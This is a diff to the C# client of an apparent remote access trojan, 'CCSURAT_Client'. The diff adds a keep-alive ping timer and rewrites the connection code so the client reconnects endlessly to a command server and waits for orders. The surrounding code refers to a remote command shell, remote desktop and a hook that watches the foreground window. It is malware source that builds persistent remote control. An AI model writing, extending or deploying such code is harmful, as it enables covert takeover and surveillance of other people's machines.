@@ -3,6 +3,7 @@ using System;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Timers;
 using System.Windows.Forms;
 
 namespace CCSURAT_Client
@@ -24,6 +25,7 @@ namespace CCSURAT_Client
 
         private string status;
         private Boolean isConnected;
+        private System.Timers.Timer pingTimer;
 
         private RemoteCMD remoteCMD;
         private RemoteDesktop remoteDesktop;
@@ -51,6 +53,9 @@ namespace CCSURAT_Client
             dele = new WinEventDelegate(WinEventProc);
             IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
 
+            // Initialize ping timer.
+            pingTimer = new System.Timers.Timer();
+            pingTimer.Elapsed += (sender, e) => Ping(sender, e, this);
             remoteDesktop = new RemoteDesktop();
         }
 
@@ -59,30 +64,37 @@ namespace CCSURAT_Client
             // Attempt TCP listener connection to server.
             SetStatus("Attempting connection.");
             Log("Connecting to server: " + serverIP + ":" + serverPort);
-            while (!isConnected)
+            while (true)
             {
-                try
+                while (!isConnected)
                 {
-                    client = new TcpClient();
-                    client.Connect(serverIP, serverPort);
-                    netStream = client.GetStream();
+                    try
+                    {
+                        client = new TcpClient();
+                        client.Connect(serverIP, serverPort);
+                        netStream = client.GetStream();
 
-                    isConnected = true;
-                    status = "Connected.";
-                    Log("Connection successful!");
+                        isConnected = true;
+                        status = "Connected.";
+                        Log("Connection successful!");
 
-                    Thread cmdListenThread = new Thread(ListenToCommands);
-                    cmdListenThread.SetApartmentState(ApartmentState.STA);
-                    cmdListenThread.Start();
-
-                    Log("Listening to commands.");
+                        //Thread cmdListenThread = new Thread(ListenToCommands);
+                        //cmdListenThread.SetApartmentState(ApartmentState.STA);
+                        //cmdListenThread.Start();
+                        ListenToCommands();
+                        Log("Listening to commands.");
+                    }
+                    catch (Exception ex)
+                    {
+                        Log("Error occurred while connecting: " + ex.ToString());
+                        Thread.Sleep(100);
+                        Log("Retrying connection...");
+                    }
+                    System.Threading.Thread.Sleep(1);
+                    Application.DoEvents();
                 }
-                catch (Exception ex)
-                {
-                    Log("Error occurred while connecting: " + ex.ToString());
-                    Thread.Sleep(100);
-                    Log("Retrying connection...");
-                }
+                System.Threading.Thread.Sleep(1);
+                Application.DoEvents();
             }
         }
 
@@ -307,6 +319,11 @@ namespace CCSURAT_Client
                 remoteCMD.Stop();
             else if (arg != "[[START]]")
                 remoteCMD.Write(arg);
+        }
+
+        public static void Ping(object source, ElapsedEventArgs e, NetworkManager n)
+        {
+            n.Write("[[PING]][[/PING]]");
         }
 
         private void SetStatus(string s)
